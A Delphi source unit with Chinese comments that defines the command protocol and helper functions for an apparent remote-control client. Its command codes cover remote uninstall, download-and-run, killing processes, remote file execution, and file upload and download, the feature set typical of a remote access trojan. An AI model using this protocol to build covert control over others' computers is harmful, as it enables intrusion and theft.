{
  通用单元
}
unit VarUnit;

interface

uses
  Windows, SysUtils;

const
  Sock_Error    = $0FFFFFFF;
  Sock_Close    = $00FFFFFF;
  MIN_BUFFER_SIZE   = 4;
  MinEx_BUFFER_SIZE = 8;
  
const
  //  管理命令
  Client_Online = $AABB01FF;      //  在线命令
  Client_Ping   = $AABB0101;      //  PIng命令
  Client_Close  = $AABB0102;      //  关闭Client命令
  Client_Remove = $AABB0103;      //  卸载Client命令
  Client_Test   = $AABB0199;      //  测试对话框

  //  单一命令
  Client_Download       = $AABB0201;  //  下载远程连接+Run
  //  Process Manager
  Client_GetProcessList = $AABB0202;  //  获取进程列表
  Client_KillProcess    = $AABB0203;  //  杀死进程

  //  文件浏览命令
  Get_DiskList  = $AABB0301;      //  获取磁盘列表
  Get_DirList   = $AABB0302;      //  获取目录列表
  Get_FileList  = $AABB0303;      //  获取文件列表

  //  文件管理命令
  File_Execute  = $AABB0304;      //  远程执行文件
  File_Delete   = $AABB0305;      //  文件删除
  Dir_New       = $AABB0306;      //  新建文件夹
  Dir_Delete    = $AABB0307;      //  删除文件夹

  //  文件传输命令
  File_UploadBegin    = $AABB0308;  //  文件上传开始
  File_UploadEnd      = $AABB0309;  //  上传完毕
  File_DownLoadBegin  = $AABB030A;  //  文件开始下载
  File_DownloadEnd    = $AABB030B;  //  文件下载完毕
  File_IO_Error       = $AABB03FF;  //  I/O错误

Type
  //  最小化(命令)数据包
  TMinBufferHeader = Record
    dwSocketCmd: DWORD;
  end;
  PMinBufferHeader = ^TMinBufferHeader;
  
  //  数据长度数据包
  TMinExBufferHeader = Record
    dwSocketCmd: DWORD;
    dwBufferSize: DWORD;
  end;
  PMinExBufferHeader = ^TMinExBufferHeader;

function HexToInt(S: String): DWORD;
function FileSize(SizeInBytes: dword): string;
function MakeSocketCmd(dwSockCmd: DWORD): String;
function Split(Input: string; Deliminator: string; Index: integer): string;
function SplitStr(var StrBuffer: String; StrSub: String): String;

function GetPointerSize(lpBuffer: Pointer): DWORD;
function GetFileSizeEx(lpszFileName: Pchar): DWORD;

implementation

function HexToInt(S: String): DWORD;
begin
  Val('$' + S, Result, Result);
end;

function FileSize(SizeInBytes: dword): string;
const
  Formats: array[0..3] of string =  (' Bytes', ' KB', ' MB', ' GB');
  FormatSpecifier: array[Boolean] of string = ('%n', '%.2n');
var
  iLoop: integer;
  TempSize: Real;
begin
  iLoop := -1;
  TempSize := SizeInBytes;
  while (iLoop <= 3) do
  begin
    TempSize := TempSize / 1024;
    inc(iLoop);
    if Trunc(TempSize) = 0 then
    begin
      TempSize := TempSize * 1024;
      Break;
    end;
  end;
  Result := Format(FormatSpecifier[((Frac(TempSize)*10) > 1)], [TempSize]);
  if Copy(Result, Length(Result) - 2, 3) = '.00' then
    Result := Copy(Result, 1, Length(Result) - 3);
  Result := Result + Formats[iLoop];
end;

function MakeSocketCmd(dwSockCmd: DWORD): String;
var
  lpChar: Pchar;
begin
  lpChar := @dwSockCmd;
  Result := lpChar[0] + lpChar[1] + lpChar[2] + lpChar[3];
end;

function GetPointerSize(lpBuffer: Pointer): DWORD;
begin
  if lpBuffer = nil then
    Result := DWORD(-1)
  else
    Result := DWORD(Pointer(Cardinal(lpBuffer) - 4)^) and $7FFFFFFC - 8;
end;

function Split(Input: string; Deliminator: string; Index: integer): string;
var
  StringLoop, StringCount: integer;
  Buffer: string;
begin
  Buffer := '';
  if Index < 1 then Exit;
  StringCount := 0;
  StringLoop := 1;
  while (StringLoop <= Length(Input)) do
  begin
    if (Copy(Input, StringLoop, Length(Deliminator)) = Deliminator) then
    begin
      Inc(StringLoop, Length(Deliminator) - 1);
      Inc(StringCount);
      if StringCount = Index then
      begin
        Result := Buffer;
        Exit;
      end
      else
      begin
        Buffer := '';
      end;
    end
    else
    begin
      Buffer := Buffer + Copy(Input, StringLoop, 1);
    end;
    Inc(StringLoop, 1);
  end;
  Inc(StringCount);
  if StringCount < Index then Buffer := '';
  Result := Buffer;
end;

function SplitStr(var StrBuffer: String; StrSub: String): String;
var
  iPos: Integer;
begin
  Result := '';
  if Length(StrBuffer) = 0 then Exit;
  if Length(StrSub) = 0 then Exit;

  iPos := Pos(StrSub, StrBuffer);
  if iPos = 0 then Exit;
  Result := Copy(StrBuffer, 1, iPos - 1);
  Delete(StrBuffer, 1, iPos);
end;

function GetFileSizeEx(lpszFileName: Pchar): DWORD;
var
  hFile: THandle;
begin
  Result := 0;
  hFile := CreateFile(lpszFileName, GENERIC_READ, FILE_SHARE_READ, nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
  if hFile = INVALID_HANDLE_VALUE then Exit;
  Result := GetFileSize(hFile, nil);
  CloseHandle(hFile);
end;

end.
